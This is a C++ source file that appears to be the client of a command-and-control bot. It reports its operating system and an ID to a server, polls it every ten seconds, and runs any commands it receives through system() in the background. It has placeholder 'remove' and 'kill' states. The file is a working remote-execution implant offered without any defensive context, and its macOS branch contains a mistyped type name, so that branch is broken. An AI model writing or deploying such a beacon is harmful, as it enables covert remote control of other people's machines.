//
// Created by christian on 4/13/23.
//

#include <string>
//#include "http-client.h" // a smaller version of the http header -> WIP
#include "../lib/http.h"
#include "../lib/json.hpp"
#include "../state.h"

using namespace std;
using json = nlohmann::json;
using namespace std::this_thread;     // sleep_for, sleep_until
using namespace std::chrono_literals; // ns, us, ms, s, h, etc.
using std::chrono::system_clock;

// set the operating system of the device based on the compilation
#ifdef _WIN32
const OS os = OS::WINDOWS;
#endif
#ifdef unix
const OS os = OS::UNIX;
#endif
#ifdef __MACH__
const Os os = OS::MACOS;
#endif

const string server_addr = "http://localhost:8080";

auto handle_state(json) -> void;

auto print(json) -> void;
auto exec(json, bool = true) -> void;

auto main() -> int {
  httplib::Client cli(server_addr);
  json info = {
      {"os", os},
      {"id", cli.Get("/id")->body},
  };

  for (;;) { // infinite loop
    info["time"] = time(nullptr);
    auto res = cli.Post("/opt", info.dump(), "application/json");
    // parse the response into a usable format
    json response = json::parse(res->body);

    // handle the task
    handle_state(response);

    sleep_for(10s); // don't overload the server when idle
  }
}

auto handle_state(json data) -> void {
  switch (State(data["new_state"])) {
    case State::remove:
      // TODO: add remove function
      break;
    case State::kill:
      // TODO: add kill function
      break;
    case State::idle:
      // don't do anything
      break;
    case State::print:print(data["data"]);
      break;
    case State::system:exec(data["data"], false);
      break;
  }
}

auto print(json data) -> void {
  for (auto const &[_, i] : data.items()) {
    cout << i << endl;
  }
}

auto exec(json data, bool blocking) -> void {
  for (auto const &[_, i] : data.items()) {
    system((i.get<string>() + (blocking ? "" : "&")).data());
  }
}